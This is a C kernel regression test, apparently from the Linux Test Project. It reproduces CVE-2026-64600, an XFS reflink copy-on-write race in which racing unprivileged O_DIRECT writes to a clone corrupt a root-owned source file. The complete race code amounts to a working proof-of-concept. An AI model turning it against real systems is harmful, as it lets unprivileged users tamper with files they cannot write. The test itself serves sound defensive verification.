// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
 */

/*\
 * Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
 * reflink copy-on-write path for direct I/O writes. The bug was introduced
 * in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
 * blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
 * the data fork mapping after cycling ILOCK").
 *
 * When an :manpage:`ioctl(2)` FICLONE clone is written via ``O_DIRECT``,
 * ``xfs_direct_write_iomap_begin()`` samples the clone's data-fork mapping
 * under ILOCK and calls ``xfs_reflink_allocate_cow()``, which drops the
 * ILOCK to allocate a transaction and then re-checks whether the *stale*
 * physical block is still shared. If a second racing ``O_DIRECT`` writer
 * completes a full copy-on-write cycle inside that lock-drop window, the
 * old shared block's refcount drops to one, the first writer takes the
 * "not shared, write in place" branch, and its write is submitted to the
 * physical block that now belongs only to the reflink source file,
 * corrupting it on disk.
 *
 * [Algorithm]
 *
 * - Create a root-owned target file on a reflink-enabled XFS and fill
 *   its first block with a known pattern
 * - Drop privileges to the unprivileged user ``nobody``
 * - Positive control: a single ``O_DIRECT`` write to a fresh clone must
 *   be copy-on-written and leave the target untouched
 * - Each round: reflink-clone the target into a scratch clone file, each
 *   issuing one block-sized ``O_DIRECT`` :manpage:`pwrite(2)` at offset 0
 *   of the clone
 * - After each round, read back the target's first block bypassing the
 *   page cache (``O_DIRECT``): any byte differing from the original
 *   pattern means a racing write refluxed into the source file and the
 *   kernel is vulnerable
 */

#include <pwd.h>

#include "tst_test.h"
#include "tst_safe_prw.h"
#include "lapi/ficlone.h"
#include "tst_fuzzy_sync.h"

#define MNTPOINT	"mnt"
#define WORKDIR		MNTPOINT "/work"
#define TARGET		WORKDIR "/target"
#define CLONE		WORKDIR "/clone"

static char *tbuf, *wbuf, *rbuf;

static int target_fd = -1;
static int target_dio_fd = -1;
static int clone_fd = -1;

static int blksize;

static struct tst_fzsync_pair pair;

static void *writer_b(void *arg)
{
	int fd;

	(void)arg;

	while (tst_fzsync_run_b(&pair)) {
		tst_fzsync_wait_b(&pair);

		fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);

		tst_fzsync_start_race_b(&pair);
		SAFE_PWRITE(1, fd, wbuf, blksize, 0);
		tst_fzsync_end_race_b(&pair);

		SAFE_CLOSE(fd);
	}

	return NULL;
}

static void drop_privileges(void)
{
	struct passwd *pw;

	pw = SAFE_GETPWNAM("nobody");
	SAFE_SETEGID(pw->pw_gid);
	SAFE_SETEUID(pw->pw_uid);
}

static void setup(void)
{
	int probe_fd, probe_dio_fd;
	struct stat sb;

	SAFE_STAT(MNTPOINT, &sb);
	blksize = sb.st_blksize;

	tbuf = SAFE_MEMALIGN(blksize, blksize);
	wbuf = SAFE_MEMALIGN(blksize, blksize);
	rbuf = SAFE_MEMALIGN(blksize, blksize);

	memset(tbuf, 'A', blksize);
	memset(wbuf, 'X', blksize);
	memset(rbuf, 0, blksize);

	SAFE_MKDIR(WORKDIR, 0700);
	SAFE_CHMOD(WORKDIR, 0777);

	target_fd = SAFE_OPEN(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
	SAFE_WRITE(1, target_fd, tbuf, blksize);
	SAFE_FSYNC(target_fd);
	SAFE_CLOSE(target_fd);

	drop_privileges();

	target_fd = SAFE_OPEN(TARGET, O_RDONLY);
	probe_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);

	TEST(ioctl(probe_fd, FICLONE, target_fd));
	if (TST_RET == -1) {
		if (TST_ERR == EOPNOTSUPP || TST_ERR == EINVAL || TST_ERR == ENOSYS) {
			tst_brk(TCONF, "reflink clones not supported: %s",
				tst_strerrno(TST_ERR));
		}

		tst_brk(TBROK | TTERRNO, "ioctl(FICLONE) failed");
	}

	probe_dio_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
	SAFE_PWRITE(1, probe_dio_fd, wbuf, blksize, 0);
	SAFE_CLOSE(probe_dio_fd);
	SAFE_CLOSE(probe_fd);

	/* The racy write bypasses the target's page cache, so must the read */
	target_dio_fd = SAFE_OPEN(TARGET, O_RDONLY | O_DIRECT);

	SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
	if (memcmp(rbuf, tbuf, blksize))
		tst_brk(TBROK, "Source file modified by a single O_DIRECT write to the clone");

	tst_fzsync_pair_init(&pair);
}

static void run(void)
{
	int corrupted = 0;

	tst_fzsync_pair_reset(&pair, writer_b);

	while (tst_fzsync_run_a(&pair)) {
		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);

		/*
		 * target_fd is O_RDONLY opened as "nobody".  FICLONE
		 * checks inode permission against our effective UID.
		 */
		SAFE_IOCTL(clone_fd, FICLONE, target_fd);
		SAFE_CLOSE(clone_fd);

		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);

		tst_fzsync_wait_a(&pair);

		tst_fzsync_start_race_a(&pair);
		SAFE_PWRITE(1, clone_fd, wbuf, blksize, 0);
		tst_fzsync_end_race_a(&pair);

		SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
		SAFE_CLOSE(clone_fd);

		if (memcmp(rbuf, tbuf, blksize)) {
			tst_res(TFAIL, "racing O_DIRECT write to the clone succeeded at loop %d", pair.exec_loop);
			corrupted = 1;
			break;
		}
	}

	if (!corrupted)
		tst_res(TPASS, "Source file survived racing O_DIRECT writers");
}

static void cleanup(void)
{
	tst_fzsync_pair_cleanup(&pair);

	if (target_dio_fd != -1)
		SAFE_CLOSE(target_dio_fd);

	if (target_fd != -1)
		SAFE_CLOSE(target_fd);

	if (clone_fd != -1)
		SAFE_CLOSE(clone_fd);

	free(tbuf);
	free(wbuf);
	free(rbuf);
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.runtime = 180,
	.needs_root = 1,
	.mount_device = 1,
	.mntpoint = MNTPOINT,
	.filesystems = (struct tst_fs []) {
		{
			.type = "xfs",
			.mount_check_support = 1,
			.min_kver = "4.11",
			.mkfs_ver = "mkfs.xfs >= 1.5.0",
			.mkfs_opts = (const char *const []) {
				"-m", "reflink=1",
				NULL
			},
		},
		{}
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "2f4acd0fcd862e22eab45690ec2c08c80b6ef2e7"},
		{"CVE", "2026-64600"},
		{}
	},
};
